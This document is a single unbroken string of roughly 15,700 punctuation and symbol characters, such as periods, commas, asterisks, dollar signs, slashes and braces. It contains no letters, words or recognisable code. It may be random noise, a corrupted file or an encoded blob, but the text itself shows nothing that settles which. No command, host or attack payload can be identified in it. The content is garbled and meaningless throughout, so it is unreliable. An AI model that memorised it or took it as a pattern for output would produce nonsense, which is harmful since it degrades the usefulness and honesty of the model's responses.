.*,,%/*.!}^_^#^*+%/:!^=!}+*$!*!#_;}^$$$$#^#;::_%:+;#;},/,+^.^//:/;/&=%*#*$*!#,!+#:$#$#$+_.,:;_.^:!;}/*+}/,%!&//^&/&.*$%&*=#:=$}^}&$$.&##_$_;::.!;,/+,;,^+,}&.;$#}_$=,&&$%/$&}/#,,#.&$#&:}+#*=!&=!*&:.^_.*}_$!.!$%__.:#:*.^=:=&&;^}+=+//.:+./.+;%/+!}=#=*}^/*/%&/%,!*}_$_.*;^,;^$^%.;.#;:&;+_^:}+^.},}.&$*}$##$_$_%:,}==/=+}$$+%;^!/=//&.,#;;;=^*^&+.;+};$^#_#!=,*#!;=.}=:=:.#:!/%*$*__&_}&*$+!/&*==/=:../%..&#^$*,.};#;*,^__##_^:$:/,$;$%,%%!;=$=%%;/!&+!_&**+*&!}$,}+},$%#=_$_=/+/%%#%**^/#^/^%+&/$%^%}%_%%*#!%!,.!,#,*^^#%_*_%.=:%;.;,;*^;%:++,/+!%#.;&=:}}!*^.+,=,/^.#:_;:.:*.,..;=;+^,^=^&;.^__=;*,;%=+*!}/$!.,=^#^*+^_:.^.:.!.*;/,$^_!;}_$$$%#,!;*^!$:/..;+,:^=$__}_!:_:,.#;$^!+!.:=:}_}!$+&:%!%^*$^*._;;,$,%:=$!#+_^;_.=.;;},}!#=.}}}&&:&^&^}+!}*.!+=$.+,_^:+=+/;__!.#;$;&/&};===*}^$_&*&+%&}}:$..;};&#=$#$/#%_=_*.,;};+.^**===/}.%!/+&*%%*;$;$!.&;^,_,!,%/!.:&:,:!&%.*;!$!%&:&%+&&,&;%+:}_/.=./;.$*};$:#&_&:::*,;._;/:%:##.,.^&}&;_#&=;/!:$.,;#;*$.$&#+_;_+:%.+.+;:,;,:%:=$},$#$**%%:*&!^!^$==!$:},#;#:!.,!;$!!;*+!==.*_+#+!!$/#._}=^*/!^=+=%.#$.#_#$_+^+:}.}//;$,&^=+$+$+*/./!}*%:*:#!=;=%}/},$$$*;***//&%%,*#,.,:^=^!*=!.=}_!*#,}:#&..!:=}&%#+..;*.&_&/%%##;;/.}+=$};$$$%&!%=*$!.!,===;}=}*#.;#+*/&&;%$^.,#;!_}=#}_}!$+*:%_*+%%!&!+!&;/,%^,+#.&_;:/.+;_/_/*#,!&}}}&$;*&%_%.**=/=_=$=^$:$#=}+_/.&}&&^:;=,_^#^%%%*^::$^#+_::=*#!.=*}/}/$.&*+=/#/*&^,&.+;%^_^$^&+%/%==!=:^;/^^:!%/**__#$^=+:/=//;,.&.:^_,%^+^_+++!//*+&;=:.:+}:.,.=__&*.^/+%/,&#,&.;;/,+^_%_%!*$$$#}#&_;=+!,=;=!/:;&^_^!++:_:=.$+;.+,;^:^+^*+^/,//=+:%_#:+.:;=#$},}/$%#&_%.+.#.}.,,_,$+!=+}:$=$/#._}:&},*}.,;,,#,*_&#:_}::_&#}%$*.!}!&^=/}/}/%&=&**_*!!/}^.+,=,/^..=#;_#:#+%;:;/,^,.^=^&!^$$#=#/_.*#!;!=:;;.,,^#^*.}_=_/:+,*;/;;#_^$!%%:*$+!:!&^=*%$:%.!;+,:_%$&#__&;::$.^$=%*!#!*=^&++&//&;!&*.!#!$=,}$&:,^^,+#+*.!:}.=.&;&*/!/=.}}%^/!&%&+%_+*:;.^;_;!_;$&$&_$#&:&:*!&&**%!,=#///_/=%!&,%&*#!+!_!,$&$.$=$^.:.%_&.,.;;+}:**===/}.%^/,&#%$=.!#*!#=+:}%&+:/$=:$+_,.#*%#*;!$!%/++*+;%:&:%,*#*^!/=,;},},&^;:!_}_^_&.=_&%:*!!+=:+&+,&=}}%#%_#$!:=;=}}}}%$!$&#;=/+$$*%$.};,://,&%;!}!$*#^__!!!^!#!&^+;,^}^&+;:*:&:%.*/*,,,,^#*+/$/,&.&#&%=$.*}+#!;^,$}^=;*_^_/:&:%=%/+=,$,++_+%*.$;###*_;$&:!.+;:,=,/^.+}^+:.&$&%%,&/**!^=_=!}+$:#=#/_.:}:&.;;$;%,,^$^*+^/_/!&+&#*=*/!:=}=#};$$$%$._#_*:,.__&;+,:^=;:+./}//&;&^%%*;!#&^=^}=*^$+#:_=_$:..=.&;#_&,%^,+#+_/^&#&!%+/$!=!/=.}=}&$;#$#/$=:#:%.^;#;!,+^:,*.^/.&=&&.#*$*%!,!}=*}^$#$!//_::=:/_.;};&,.^$^&+,};/*/;%_%!*,!:;&=/}.$}}+#;_$_+:,!,.*;^,_;%^++:+&//#!%}%&*;*=!%=,=*}*^}#_#!_+_#.=./;=,},;^;+$+%+.&#&*%$*_*+!+=:}==^$.#}#__;_%:%.,;#.&,^^_^.++}%&=&/%.&!*&!;!,=%}#$#$*#^#$_!:+:+;=;.,.^}^&^:/$/%/&%#%^*^!_!!!,}:$=}*#.+^_&:;.$.%;,,#,%^^^;+!/,&:/*%/*.!=!&,%}$}%$,$}#*_^:#:!*/;:,=,/;.+}+&/.&$&&%,_;***;=_=!},$:%;#/_.:}_+.;;$;+,,}$^*+^/_+%&+%:%&*/+.=}=&};}=$%#,#*_*&}._.!;+;#^=^/+=/}/;&;%$%%%.!#!*=$}_}+$+#:_=#^:..}._;;;%,%^,+#^&/^&_&.%+_%!=!/=.!!}&$;$,#%_#:#:*.^.$;!,+,++=+./.&}&&&:*$*%*&=#=^}^$_$!$,_::=_*..%^;&,;^$^%+,/#/%&^&;%!*,!:**=/}.$=$&}^_$_%:,:}.*;^,#,!}/+:/=//+.%}%&*.!$!&=,;;}*};#_#!_,::}_./;.,};+^;+$++/,:,&*%^*_%%!+=:=&}/&.#}#&_;_=:%.,.*;*!}^_^!+++#&=&/%=*}*;!;=$=%=.$#$*#$___+:+.:;=.^,.^}^_+;+%/%&,%#&&*^!_!.=+;%$=$/#.$!_&:;:,.%;#,#,*^^^$+!/+/+%=%.*.!}!&!:}$}%}&###^_^:_:!:,;:,=;*^.=^+&/;&$&%%,*#*%!^!;=!},$:}*#/_.:=:&:!;$;%,,,}^*+^/#/!_/%:*=*/%.=}=&}.$$$&#,+;_*_;._.!;,,:.*^/+./}++&;%$%+*,,,!*=^}_=%$+#:#&_/},.}.&;;;=,%^,^*+*$}&_&!%+%#!=!/==}}};$;#$#%#.:#:*.$;_;+,+^:+=^^/.&}&_%;%%*%!,=#!&}^$_$.#++%:=:/..:!;&,;,,^%+#/#/*&^&$%!*+*+===.}.$}$&$:_$_%_&.#.^;^,_,!,,+:/=+*&.#^%&*;!$!%=,}#}%$^$;#!_,::_*./;.,=,&;#+$+%/,/}&*%^*#*!;/=:}=}/=.#}#&_.:$:&.,%;;*;;^_^!+,/:++&/%.*}%+!;=$=+},/,$*#^__#%:+.:.&;/*,^}^&+;+=/%&,&*%*:}!_!!=+=#$=$/#=_}_;:;.$.%..,#,*^$+_++/+&:%=&^*.!}!_=;=%}%$,##$&_^:_:..+%%,=,/^.,!+&/;/,&%%#*#**!^!$=!}+}+#=#._.:}:&::;$;%;&^#^^+^/_/!/,%:*=%*!..^=&};$$$%#,_#_%:^:;.!;,,:;*:^+./=/&.+%$%%*,*}!*=^}#}!+/#:_=_/#..}.&;.,$,&^,=;+*+;&_&!%,*:/.!/=.}}=+$;#$#+_,+%:*.^;_.%,+^:^&+/+.&}&&%;%=*%!,!*=*,}$_$!#+##:=:/.=;};;,;^$^%^./#/*&$%_%+*+!:==!^}.$}$_#;#%_%:,.#:&;^,_,.^+=%/=//&./!%&*;*,!%=#}#}*$^$$#!_+_+.=..;.,},&,:+$+%+&&#&^%^*_*!*,=:}==*$.^^#&_;:$:%.,;#;%,^,;^!+,/:+*&/%.*=*&!}=$=%},}}$*#^_#_!%/.:;=;/..^}^&+./$/&&,#;%*%;!_!!=,}:;#$/#._}#+:;.$.+;,#/,*^^+_^%/+&:&&%/&+!}!&=;==}%$,$*#*/}:_:!.+.#,=,/^=+}+;/;&$&%&.*#**!$=_=+}+$:#=$^_.:}:_.;.%;%,,^#,&+^/_/.&+#%*=*/!.*!=&};},$%##_#_*:^:$.!;+;+^=^.+./}/&/:%$%%%&!#!^=^}_}!},#:_=#*:.&^.&;;,$,%^,+#+%/^/;&!%,*:%*!/=.}=}&=}#$#%_,_}:*.^;#;!=/^:+=+/^.&}&&%.*$*&!,.;=*=;$_$!#,_:*!:/..;}.+,;^$^++,.!/*&^%_&%*+!:!&=/,:$}$&#;#=_%:,:*.**},_,!^+^#/=//&=%}%;*;!$!%!.}#}*$$#_#+_+::.=:^;.,},_^;^%+%/,&#/&%^*_*.!+.%}=}/$.}!#&_;_,:%.#;#;*,^,$^!++++&=&.%.*}*&*:=$=%=&$#$^#^___!_,.:;=.*,.!^^&+;/$/%&,%#%%*^*;!!=,}:=*$/#._=_&#+.$.%;,;},*^^+#+!#/&:%=%/&.!}!&=.}$}&$,^;#*#;:_:!.,;:_+,/^.+}^+/;&$&+%,;$**!^=_!%}+$:$&#/=.:}:&.;.=;%,,,*^*}}/_/!&+&#*=*/!==}=;};$$$%$._#_*:$._.+;+,:^=,^+./}/_&;&%%%*,!#*&=^}_}.$+^%_=_/:._!.&;;;,,%^#+#+*/^/$&!%+%+!=!.=.}}}&}:#$#%#&:#:^.^;_;!;,^:+=^*/.$^&&%;*$*%!,=#=%}^};$!#,_:#*:/..;=;&#,^$^%+,+}/*&^%#%!./!:===/!.$}$&#._$_&:,&;.*.;,_,!^,+:^;//&.%}&+*;!$!+=,&/}*$^#_$%_+:::&./;_,},&^;^=+%/,/*&*_}*_*!!+!#}=}/$=#}#;_;:$:%:.;#;*,$^_^+++/:&=/^%.*}*_!;!%=%},$#}&#^___.:+&%;=;/,.;!^&+;+,/%&#%#%**^*$!!=+=+$=$.#._}_&_:.$.%.&,#,^^^+_+!+,&:%=&**.:^!&=;}$}%$,###%_^_;:!.,;:.*_^^.+=+&$^&$&%%,%}**!^=#=!^/$:#=#/$.:}:&..;$;&,,!;^*^;/_/!&,%:;_*/!.=}!+};$$$+#,%,_*:^._:%;+,:,&^/;_/}/&&;&=%%*,**!*;}}_}!$+$#_=_/:=.}.;;;,$,%,.+#+*/$&_&+%+*:!=*^=.}}}_$;$%#%_,:#_&.^;_;.,+!%+=+//.+!&&%;%,*%!#=#=*}^}$$!#+#+:=:...;};&;:^$^%^&/#/^&^%_%!%,!:==!*}.,^$&#;_$_%:,.#.%;^;;,!^,+:^*//&.%=%&:#!$!%=,=}}*$^###!&/::.=./:.,},&^.+$+&/,$;&*&;*_*!!,=:*,}/$.#}$+_;:$:+.,=&;*,^^_,%++/:/&&/.#*}*&!;!==%},}*$*+}___!:+:#;=;/,=^}^;+;/$/%/.%#%**$!_!+=+}:$=}^#._}__:;:%.%;,,#;&^^+_+./+$%%=%/*.%!!&=;=,}%$####*_^_$:!.+.+,=,.^.+}+&+:&$&%&&*#*^!^=_=!=,$:#=$*_./^:&.;;$;%,,^#^%+^+;/!&,%:&**/!.===&,/$$$%#,#}_*:^.#.!!/,:^=^/,./}/&&.%$%&*,:;!*!;}_}!$,#:$*_/:..}:+;;,$,+^,}/+*/^&_/%%+*:*&!//,}}}&$;$=#%_,_*:*%};_;!,+,#+=+//=&}&;%;*$*%*.=#=*}$$_$+#+_::=_^..;};_,;,%^%+,/#+&&^%_%.*+:%===/}.=!$&#;#,_%:#.#.*;^;$,!^+^+/=/.&.%}%&%:!$!%!&}#}^$^#_#!#,::.=:*;.*^,&^;+$+%/,&#&%%^%;*!!,=:!*}/$.#=#&$$:$:%.,.};*,^^#^!$//:&=&//.*}*&!.=$=&},,;$*$;___!:,.:$!;/,.^},++;/$/+&,;}%**^!_*%=+}:}&$/}/_}_&:;:=.%;,;*,*=}+_+!/+/#%=%/*=!}!;=;}$}%}.###*_$:_:+.+;:,=;^^.+}+_/;/%&%%,*#%&!^=_=.}+,%#=#/_.#!:&.;.,;%,#^#^*+^+$/!&+&+*=*.!.=}=&=:$$$%$&_#_^:^._.!.,,:^=,*+.}^/&&;%$%%*,!#!%=^=;}!$,#:$*_/:..=.&!+,$,%^,^}+*/^&#&!:/*:!=!/*.}}}&$.#$#&_,/;:*:;;_;!,,^:^$+//.&}/+%;*$*+!,&+=*}^$_}%#+_:_&:/#.;};&,;,=^%+,+*/*#}%_%!*+*#===/}=$}$;#;_$_%_..#.*;$,_,+^++:/=+^&.%}%_*;*%!%=,}#=&$^#_#._+/%.=./;..!,&^;^,+%/#&#&*%^%$*!!+!+}=}.$.#}#&#::$:%:&;#;^,^^_^!^,/:&=/*%._^*&!;=$=%},$#$%#^#;_!:,.::*.+,.^=^&;//$/%&,&}%**^!#!!,/}:$=$/}._}_&:..$.&;,*;,*,;+_+!/,&:;+%/*.!}*+=;}$}+$,,^#*_^:__%.+;:;&,/=#+}+&/;/=&%%,%***.}=_=!}+}##=#/_=:}:;.;;$;%;.^#^*+$/_/+&+%:*=%^!.=}=_};}%$%#,_##&#^._..;+*%^=^/+.^!,:&;&,%%*#!#!*=^=$}!$+$+_=_.:..}.&.:,$,%,&+#+^/^&_&!&,*:!=**=.;^}&$;#$#%_,:#:%.^.;;!,,^:,*+//.&=&&.%*$*%!,!}=*}^$#$!$!_::=:/.__^;&,:^$^^+,/#/*&^^/%!*^!:!*=/}:$}}+#}_$_&:,!!.*;^,_.!,.+:+!//&:%}.!*;&&++=,}$}*}:###*_+%;.=.;_=,},&^;,*+&/;&#&++#*_*!!+*+=!}+$.}!#._;:}:%=_;#;*,^;_,/++/_&=&+%.;_*&%}&*=%};$#}:#,_#_!_/.:.&_:,.^}^&,*/}/&&,&!+,*^!_!!*!}_}!$/#.*#_&:..$.&;,,#,*,;^%+!/^&:/!%/*.!}*+=}}$}&$,=+#*_^:__%},;:;*,/#$+}+&/;+$&%%,*}**!;=_.+}+}##=#/_$:}!%.;;$;%,,^#^*+;/_//&+%:*=*/!.=}=/};$$$%#._#_*:^._.*;+,_^=^^+.^}/&&;%=%%*;!#+%=^=$}!$+#$_==::..}.&.:,$,%^_+#:./^&_&!%+*:!=!^=.=%}&$:#$}%!}:#:/.^;$;!$}^:,*://./&&&;/*$*%!,=#=*}^$}$!#:_:_*:/_.;};&,#^$^++,$}/*/;%_%!*_!:.:=/}.$}$&#;_$_^:,:%.*;;,_.!^++:+///&$%}#:*;*=!%=,=&}*;%#_#!_+_#.=./.*,}=;^;+$+%/.^/&*%=*_*%!+=:}=}/=;#}#;_;_^:%.;;#:*#$^_^+++/}&=^_%.&!&&!;!/=%%/$#$*#^#$$!:+:%;=_+,.^}^&+:,+/%/!%#%/*^!_!!=+!.$=$.#.#,_&:..$.%_:,#,*^^+#+!/+&:%=%.*.!}!&=:}$}%$,#=#^_^:_:!!+}$}!}!$+%^+&/;&$&%%,*#**!^*.=!}+$:}*}/_._!:&.:;$;%,,,};*+^/}/!&,%:*=*/*_!/=&}#$$$&#,_#_*:#$:.!;:,:^=^/+:/}/,&;%$%:*,!#!*=;}_}!$+#:#,_/:..}.&;;,$,%^,^/+*/^&_&&%+*:!=!/!*}}}&$;#}#%_,:#:*#=;_;/,+^#+=++/.//..%;*$*%*&=#=%}^$#$!#.=!:=:/...:;&,.^$^^;$/#/*&^/+%!*^!:!++:}.$}$&$,_$_&:,.$.*;:_*,!^++:+}//&:%}%,/}!$!%=,!^}*$,#_#^*_:::!./._,},/^;+$+%/_,%&*%^*_%%!+=_}=};!=#}#&_;#,:%.;;#;*;+^_^/++/#&=&,%.*}%%!;!%=%}:$#$&#^#*};:+.};=.},.^=^&+$/$/^^$%#%**^%+!!=^}:$=}&#.#%_&::.$.+;,,#;!^^^!+!/;&:&*%/*=,/!&=#}$=$$,#$#*__:_:/#_;:,=,/;/+}+//;&$.:%,%!**!^=_=!}+$:%$#/_$:}:/.;;$;%,,#!^*+:/_/%&+%:*=*/&#=}=&};$}$%#,_#_&:,._.!;+,:^=^/+.++/&&;%$%%*#!#!*=^}#}!$+#:_=_/:..}.&;;,$,%^,+#+*/^&_&!%+*:!=!/=.}}}&$;#$#+_,:#:*.^;_;!,+^:+=+//.&}&&%;*$*%!,=}=*}^$_$!#+_::=:/.:;};&,;^$^%+,/#/*&}%_%!*+/;===/}.$}$&#;:$=*_#:!.*;^,_$&#$__#*+.&=%}%&*;;!,^^.++/=&$}##&_+::.=!,=}}!%&^;+$+%/,&#&*.^+_&,**=:}=}/%#%,%:*_%^}:$;=;}/$,_=$&*%/:&=&/%.},*,!;=$=%/.++/+%_$$_!:+.::*;:,.,*^&+}/$/%&,%#%%*^!}!!=;}:}!$/#=};_&:_.$.,;,,$,*^,+_+/,_&:%=%/*}!}!/=;=**;$,###*_}:_:*.+.#;+,/^#+}+./;&$&%%,*$**!.=_=&}+$_#=#/!$:}:^.;;=;%,,^#,&,^/_/&&+%_*=*/!.*!+$};}*$%#}_#_*:^:$.!;+,=^=^++./}/&&;%$%%*$!#!*=^}_}!},#:_=__:..=.&;;,$,^^,+#+^/^+.&!%^*:!=/_=.=,}&$##$#%_,_}:}.^.+;!,;^:+=+/^.&}&&&%*$*#!,=}=*!^$_$!$!_::=:/.$;};&,;^$^=+,+//*&^%_%!*+!:!$=/=*$}$&#;_$_%:,:,.*./,_,%^+,:/=////%}%}*;*+!%=,}#}*}*#_#%_+:#.=./;.,},}^;^;+%/:&#+*%^*_*_!+!+}=}.$.#}#&_;_,:%..;#;&,^^_^!++/}&=&$%.%;*&!;=$=%=!$#$/#^_$_!#+.:;=;,,.,,^&+$/$/^..%#%^*^*.!!=^}:=*$:#.#&_&:}.$.%;,,#:$^^^!+!/^&:&&%/*.^%!&=#}$}/$,###*_^$}:!.+;:;!,/^.+}+^/;&$&%%,*}**!^=_._}}$:#=#/=:%&*,!,$!}:$#$=$+&*/$/!&+%:,}+_!#=}=&};}=$;#,_$_*:;._.!;+;:#,^/+:/}//&;%$%%*,&=!*=^}_}*$+#:_=_+:..}.&;;;},%^,+#.!/;&_&!%+;.;%&$=$}}}&$;&*%&%_***^.:;_;!,+$*#!#*:}!$&.%;*$*%,!^:^//_/$//:!#/:=:/..$+};}##!#,#.#%::...!/,%!!:===/&*+%/,&;*!*,*.*%=:}.}!*_^;+:/=//+:+;.,***/!%=,}#&*/%%#%&*:=&!&+*;$,},&^;#+#*_#:};}%_*_*!!+^}+!/^/+&&_#_$:$:%.,=#}/$,$,##/;+$&=&/%.^#;%,#+!+&+//*%/%_%$%^!:!#!%_%}&}*$%#^/^/_&,%#%*;$,$^.^./=/+&$&+%&.:_%.$.%;,$!#*_;#!#/_::#.$;.;_$*!&=;}$}%_}$/#*_^:_=/=:=^}/}/$;$!#,^./,&%%,*#+_+./:&}%:/;&%&&*$*&#=.;;$;%;.;$^*+^/_/&&+%:*=&/!.=}=&};$$$%#=_#_*:^._.*;+,:^=^/+.^!/&&;%=%%%^!#!*=^=$}!$+#$_=_+:..}.&:;,$,%^:+#+//^&$&!&,*:!=!;=.=+}&$;#$#%_,:#:/.^;$;!,,^:,=+//./*&&%_*$*_!,=#=*}^$=$!#+_::=:/:_;};&,$^$^$+,/#/*&#^:%!*_!:!!=/}:$}$/#;_$_::,.#.*;,,_,!^++:^.//&}%}%+*;!=!%=$!%}*$_#_$*_+:_.=./;.;%:.^;+$+%+;&#&%%^*=/^!+=:}=!/$.#=#&#:_&:%.$;#;_,^^_^!,+^+&=&:%.%/*&!#=$=%},$#$;#^_#_!:+.:;=;/,.,^^&+_/$/%&,%#%**^**!!=$}:}!$/$__}_&:}.$.=;,,#,*,;+_+!/#&:&_%/*.!}*+=;}$}:$,#=#*_^:_#!.+;:;,,/,*+}+;/;/=&%%,%^**!#=_=!}+$:#=#/#*:}:$.;;=;%.,^#^*+}/_/;&+&_*=*/!.=}=$};$}$%#,_#_*:^._.;;+;/^=^/+./}/&&;&&%%*,!#!%=^=**=$+$!_=_^:..=.&;#,$,%^=+#+*/^&$&!%+*:!=!#=.}}}&$;#$#%_,:#:..^;_;!,^^:+=+//./^&&%;*$*+!,=#=*=;}%$!#__:_$:/..;};._,^$^;+,/#/*&,%_%**+!:!,=/}.$}$+#;_$_%_.:&.*;#,_;!^++:/=+^&=%}%.*;*$!%=,}#}*/,#_#^_+:_.=.+;.,}:^^;+$+%/;&#&*%^*_*&!+=:}=}^$.#}#&/+_*:%.,;#=;$,$/$/;;/=&=&/%.;},^^.^.+}=*$#$*#^#$_^:+.:;=;+,.^}^&+;.:/%&,%#%%*^!$!!=_!!$=$/#.#,_&:..$.%;,;!:,^^+_+!/}&:&!%/%_*/!&=;}$}/$,###*_#}::!.^;:,=,/^:+}+//;&$/.%,*#**!^=_=!}+$:!;#/_.:}:+.;;};%,_:%^*+^/_/!&+%_*=*/&#=}=&};$}$%#,_#_*:,._.!;+,#^=^/+.+,/$&;%$%%^_+#+&+_+=++/,&;%/%^_%.}.&;;,$,:^,+#+*+;/*&!%+*:*!!/=.}}}&/.#$#%_,:$:*.,;_;!_+^:+=+//.&}&&%;/&/^!,=#=*}$$_$*#+_#:=:;#=;};&,;,/^%+;/#+&&#%_%!*+!_===/}.$}//#;_$_%:;.#.%;^,_:&^++:/=/+&.%}%&*;!$!%=,}#},$^#_#!*;_%.=./;.=!$;#.#*_;_!:;.^#+%}*!!+=:&$+&/$%*%/%+*%=+=#=}=,$_$$$&;&_/_%:&.,:+*$!;=$=%%}/*/+*.%!%%*_!&=%}.+/,;^&+;/$;#;:,_^=+:,!^&^//}//$$$/_}_&:;}+!^=_}##/#_#$#^:}.$./#=*$!}!&=;+//&//&*##_^:_:!:,;:,=,/^.^/+&/;&$+%%,*#**!^=_=!};$:}*#/_._!:&.$;$;%,,^#^*+^/_/!&,%:%**/%.=}=&};$$$%#,#!_*_;._.!;,,:,!^/+./}++&;%$%+*,!}!*=^}_}!$+#:#*_/:#.}.&;;,$,%^,+#+*/^&_&%%+*:!=!/=.}}}&$;#$#%_,:#:*.^;_;*,+^:+=+//.&}&&%;&,*%!,=#+&}^$_$!#+_::=:/...$;,,;^$^%#+#*:$:%_}%+*+!:==^//:/,/+&_^%#!:,.#.*=/}!};$.::_!:_.},*.;;:;!,*^.#;!}$}#_#!_+*}!}!,=$=!$#$^#//_/#&#&*%^;_,&^^^^+_},$.#}#&_;!::;.,;#;*$=$.$&_:_#_&%*%_*}*&!;^^+^.$$#$*#^___!:+::#=+&,$^}^&+;#/:&:!:!.^*$!_!!=++:/_&+/%%,%*!=$!#*;,,#,*.+#}_+_,_!./.^;#&$+&^$/=/}/!%=!!%.*:*%!.$.=*$;#}$!.!;._!.+/$;;,:,&^/^/%%!_===/$=***;!:!!=*}.:.:#+:/_/!&+;};!;;^:+_*+};$$$%%=&!%+*^!}#:_/:.$^#+#^_&_^^^.=.*,.,;,!^}*./&//&,}}%:$:#$=:}.}:$,$:;_=&/,!&&!%+*:!=!/=.$}%%%&$;#%_,:#}.!:===!#;#=$*#:_%:*.;&$%,*%!,=#&_&.%:*}!.*=*%*&=$=&::;!^$^%+,#!_!:/:!;$,,^=,*+*=&$}$&#;%:*&*=}#=$},=/$+$,#$*;/.&.%}%&;#^}^/^&+*}/=$#_#!_+$.*%=.=_=/$;$:$!;*.,_*.&.%;/,&//^$+}+^/$*$&+*#*%*/$/#$=/$..*##_}_,:;:;^^/=/&&;&!=.},$#$*!}%=%/*+}*=/=;*%,%^&+;/$:..;..;^;:!_!!=+}:*=$/#:_}_&:;.$.%:$#=,*^,+_^!/+&_%=%#*.*%&.=;}$}%},###%_^_$:^.+;_,=;}^.+}+&^;.^&%%;*#*%!^!}=!!+$:#=#+_.:=:&:#;$./,,^#^/+^^+/!&+%:&=*/!.!*=&}_$$}_#,#}_*:^:!.!.+,:^=^/+./}/&&}%$%&*,!#!*!;}_}!$##:$,_/:..}.&;;,$,,^,^*+*/$&_&!%+*:*%!/=}}}}&$;#$#%_,:$:*.^;_;%,+^:+=+//.&}&/%;*$*%!_=#=*}^$_}$#+__:=_^.=;};/,;;,^%+,/#^*:/%_%**+!_==!,}.=}$&#;_}_%:;.#:+;^;$,!^++$/=+}&.%}%&&;!$!%=:}#}/$^}/#!#,::.=..;.;},&^;+$+%/,&#&,%^*#*!!+=:!*}/$.$+#&#^:$:%.,;#;*,^,&^!++/:&=&/%.*}*&!$=$=,},}/$*#^___!:;.:./;/,.^}^&+;/$/&&,%#%**;!_!!=+}:$=$/#:_}_&:;:=_%;,,$,*^}+_+!/++:/&%/*_!}!&=;=*}%$$=^#*_;:_#%.+;_,=,+^.^%;./;&$&%/.*#*%!^==%^}+$:#==!_.:=:&_;:*;%,.^#^*+^/=/!+_,$*=*^!.%/=&}.$$$/#,#!},:^._.!:_,:,!^/+$;//&&;%$/}*,!$!**^==}!$,#:_=_/:$.}_.$_,$,/^,;^+*/,&_&+%+*}/+!/=.}}!$$;#}#%__}%:*.^;_:#,+^_+=,/+$&}&+%;*$*%!_=#=*+&$_$%#+_::=:/..:!:&,;^=^%+;/#/*&^&$%^*+!$===,}.$}$&};$*_%:_.#.*;^;:,!^++#/=/,&.&!%&*$!$!^%$}#}*$^&##!_^::.==%;.;^,&^.+$+%/,/}+:%^%/*!!_=:}=}/=.#}#&#%:$:..,.^;*,^^_^!+}/:/*&/%_*}*&!;=$=&},}+$*#^__#%:+.:.;;/;}^}^&+;^$/%&,&^%**$!_*^=+}:$=$/$%_}_+:;.=.%..,#,*,!+_^+/+&:%=//*.!}!}=;=/}%}/###*_^:_::.+;#,=,^^.^/+&/;/,&%^^*#*%!^!/=!}.*!#=#/_.}$:&..;$;^:$^#^*+^_#/!&^%:&**:!.!,=&}_$$$%#,_#=*:^:+.!;,,:^=^/+.+!/&/*%$%/*,*,!*=:%*}!$+#:*__/::.}_._#,$,/^,:.+*/,&_&*%+*}/+!/=.}}&!$;#}#%#._%:*:/;_;^,+^:+=+/.!&}/%%;%:*%!,=#=*!!$_$}#+_#:=:^.../}.,;^}^%:%/#/%&^&.%!*./!===/}.%.$&#._$_^$$.#.*;^$^,!^^+:/=:%&.&^%&*;!$!%=,=!*,$^#_#!*!:::!./._;/,&,^+$^,/,&#&*%^,^*!*/=:=%}/$.#}#&_;:$_!.,;};*,;^_,%++/:/}&/&}*}*&!;=$=%},}#$*$&___!:+.:;=;/;;^}^++;/=/%&$%#%*%/!_+^=+}_$=}&#.#%}.:;.$.%$$,#,%^^+=;^/+&:%=,=*.!=!&!:=&}%}+###;_^:_:!._#.,=;&^.+}+&/.&$&/%,*#%;!^=_=!},$:#=#/_.#+:&.;;$;+,,^#^*+^^+/!/&%:%**/!_=}*&/$$$$/#,_}_*_;._.^:;,:,;^/.#/}//&;%=%%*_/%!*=^}_%&$+#__=$:$$.}._;;$},%^;+#^%/^&=^^%+*:!=^+=.}=}&$#!&#%_,:#*%.^;#;!;,,!+=+$/.++&&%;*$&%+#=#=:}^}/$!#}_::=:/...;;&,:^$^%+,/#/*&^&^%!*^!:===/}.$}$&$*_$_$:,.$.*.;,_,!^}+:+_//&.%}%&*;!$!_=,}$}*$,#_$%_+:::;./.!,},&^;^&.*/,/^&*%,*_**!+=$}=}/=!#}#&_;:=:%.,;#;*;$^_^!++/_&=&/%.*}*_!;=$=%};$#$*#^__}.:+:&;=;^,.^=^&^:+&/%/!%#%$*^!_!!!,!:$=$}#.#._&:;.$.%#!,#,:^^+$+!/^&:&+/,*.**!&%.}$}&$,#}#*_:}*:!.+;:_!,/^:+}+&,_&$&%%,*$**!^=_=!},$:#=#/_$:}:&.;&%;.,,^#^*_:_!:#._.&;_,.$;!&=&};$$/^%;*}*$!_,!.^;+,:^=#$#,#*:;:::*__%:!#!*=^&./=/.*$%!%*!}=*=;=:=&$,$.#=,=_!:}.=.&%+!=!/=.!!==$;#$#%_;:#:*.^.$;!,+^_+=+;/.&}&&%;*$*%!,=#=&}^$#$!#+_::=:/..;};&,;^$^%+,/#/*&^%_%!*+!:**=/}.$}$&#:_$_%:,_#.*;^,_,!^++:+%//&.%}%&*.!$!%=,}#}*$^#_#!_,:::!./;.,},&^;+$+%/,&}&*%,*_*!!+=:}=}/$:#}#&_;:$:%.,;#;*;*^_^!++&,+%&/%.*}^*,,,*/+/;/.&^*.%!%%*_==!*=,:,$;$^#,__%=/!%#%**^;%,%+}+}//&:&%%:*;,,:,.%;,,#_;#_#=:&:::#:+;$,#,&,;!&}$}%$,*;&!*.!#!#}+=^}!}$#}$!.;/=&$&%%,^#,$^,,/+++,/$_##=_.:}:&}!!*=^},_=#^#;#*:..;;=/^%&!.=}=&&#/%&}%#%#%!*;!=}&}:}#}+#$_#_&=//%%$%%*,+^+//+&.%+/&%$%}*;!}_=.,;;,$,%#}_$_}:_=}&/%+*:!=,_+:+,+,$_}/#%_,:#=+=_=,}+}+$.$*#;.$:$;&./,},+^#/++=+./=&*&&*$*/_#..;};&;:;!^%+,/#/&&^%_%!%,!:===+}.$=$&#;_$#/:,.#.&;^;/,!^++:^=//&.&!%&*:!$!+=,=}}*$^#=#!__::.=./;.,},&^:+$+^/,&}&*/^*_*!!,=:=*}/}*#}#&_;:$:^.,;#;*,^^_^!++/:/*&/%$*}*&!;=$=%},$#$*#^___*:+:#;=;/,.^}^$+;/$/%&,%#%**^!_!*=+}_$=}^#._}_&:;:^.%;,,#.*^^+_+!/+&:%=%,*.%!!&=;}=}%$}###*_^:_:!.+;:,=,^^.^!+&^;&$&%%,*#**!^!^=!}+$:#=#^_.:=:&.;;$;%,,^#^/+^/$/!&+%:&**/!.!%=&=*$$$%#,$#_*:^.=.!;.,:,/^/,./}/&&#%$%^*,*!!*=^}_}!$+#:#&_/::.}.&;;,$,%^,+$+*/^&_&!%+*:!=!/*/}}}&$;_/#;_,:#:*$.$*=%$^$,#/_$+!&}&&%;+=;/,!^*+,*,*!#.#._::=:/*!}=}#}#$!^/+,/#/*.+,%$,*.!:===/+!&=/!%$,&_%:,.#.*;^,_,!:+%.++//&.%}^+;:,^^,+$%&.}$$#_